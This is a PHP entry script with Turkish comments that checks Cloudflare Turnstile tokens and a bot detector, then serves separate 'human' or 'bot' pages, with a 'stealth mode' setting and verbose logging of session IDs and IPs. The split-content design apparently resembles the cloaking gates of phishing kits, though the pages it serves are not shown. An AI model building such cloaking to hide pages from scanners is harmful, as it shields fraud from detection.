<?php


// GLOBAL AYARLARI YÜKLE
$settingsFile = __DIR__ . '/settings.json';
if (file_exists($settingsFile)) {
    $settings = json_decode(file_get_contents($settingsFile), true);
    
    // SESSION'A YÜKLE (eğer yoksa)
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    
    if (!isset($_SESSION['stealth_mode']) && isset($settings['stealth_mode'])) {
        $_SESSION['stealth_mode'] = $settings['stealth_mode'];
    }
    
    if (!isset($_SESSION['adv_detection']) && isset($settings['adv_detection'])) {
        $_SESSION['adv_detection'] = $settings['adv_detection'];
    }
}



// === 1. SESSION'ı TEK SEFERDE BAŞLAT ===
if (session_status() === PHP_SESSION_NONE) {
    session_start();
    // DEBUG
    error_log("SESSION STARTED - ID: " . session_id() . " - IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
}

// === 2. Gerekli fonksiyonları yükle ===
require_once 'assets/detector.php';

// === 3. DEBUG: Session durumu ===
if (isset($_SESSION['detected'])) {
    error_log("SESSION HAS detected: " . $_SESSION['detected']);
}

// === 4. CLOUDFLARE TURNSTILE KONTROLÜ ===
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cf-turnstile-response'])) {
    
    // DEBUG LOG
    $logMsg = date('Y-m-d H:i:s') . " | Turnstile POST - Token: " . 
              substr($_POST['cf-turnstile-response'], 0, 20) . "... | " .
              "Session ID: " . session_id() . " | " .
              "Detected in session: " . ($_SESSION['detected'] ?? 'NOT SET');
    
    error_log($logMsg);
    file_put_contents(__DIR__ . '/log/turnstile_debug.log', $logMsg . "\n", FILE_APPEND);
    
    $token  = $_POST['cf-turnstile-response'];
    
    // Config yükle
    if (!defined('TURNSTILE_SECRET')) {
        require_once __DIR__ . '/config.php';
    }
    
    $secret = TURNSTILE_SECRET;
    $ip     = getRealIp();
    
    // Turnstile doğrulama
    $verify = file_get_contents("https://challenges.cloudflare.com/turnstile/v0/siteverify", false, stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query([
                'secret'   => $secret,
                'response' => $token,
                'remoteip' => $ip
            ])
        ]
    ]));
    
    $result = json_decode($verify, true);
    
    // DEBUG: API yanıtı
    error_log("Turnstile API Response: " . print_r($result, true));
    
    if ($result['success']) {
        // TURNSTILE GEÇTİYSE → HUMAN
        $_SESSION['detected']   = 'human';
        $_SESSION['bot_reason'] = 'Cloudflare Turnstile doğrulandı → Gerçek insan';
        $_SESSION['turnstile_verified'] = true;
        $_SESSION['verified_at'] = time();
        
        // LOG
        logVisit('human');
        error_log("TURNSTILE SUCCESS - Marked as HUMAN");
        
        // Çıktıyı temizle ve human sayfasını göster
        ob_clean();
        require_once 'human/index.php';
        exit;
    } else {
        // TURNSTILE BAŞARISIZ → BOT
        $_SESSION['detected']   = 'bot';
        $_SESSION['bot_reason'] = 'Cloudflare Turnstile çözülemedi. Hata: ' . 
                                 implode(', ', $result['error-codes'] ?? ['bilinmeyen']);
        
        // LOG
        logVisit('bot');
        error_log("TURNSTILE FAILED - Marked as BOT");
        
        require_once 'bot/index.php';
        exit;
    }
}

// === 5. Eğer buraya geldiyse: İlk giriş veya tekrar yükleme ===

// Eğer daha önce Turnstile ile doğrulanmışsa, direkt human göster
if (isset($_SESSION['turnstile_verified']) && $_SESSION['turnstile_verified'] === true) {
    // 1 saat geçerli
    if (time() - $_SESSION['verified_at'] < 3600) {
        error_log("Already verified via Turnstile, showing human page");
        require_once 'human/index.php';
        exit;
    } else {
        // Süresi dolmuş, temizle
        unset($_SESSION['turnstile_verified']);
        unset($_SESSION['verified_at']);
    }
}

// Normal tespit sistemi
$status = detectVisitor();
logVisit($status);

// Unified Bot Detector log için - index.php'ye EKLE
if (isset($_GET['unified_bot'])) {
    $_SESSION['detected'] = 'bot';
    $_SESSION['bot_reason'] = 'Unified Bot Detector: ' . 
        urldecode($_GET['reason'] ?? 'Bot tespit edildi') . 
        ' [Advanced: ' . ($_GET['advanced'] ?? '0') . 
        ', Stealth: ' . ($_GET['stealth'] ?? '100') . ']';
    logVisit('bot');
    
    // Eğer AJAX isteği değilse, bot sayfasını göster
    $headers = getallheaders();
    if (!isset($headers['X-Requested-With']) || $headers['X-Requested-With'] !== 'XMLHttpRequest') {
        require_once 'bot/index.php';
        exit;
    } else {
        // AJAX isteğiyse sadece 200 dön
        header('HTTP/1.1 200 OK');
        echo 'OK';
        exit;
    }
}

// Karar ver
if ($status === 'human') {
    require_once 'human/index.php';
} else {
    require_once 'bot/index.php';
}
?>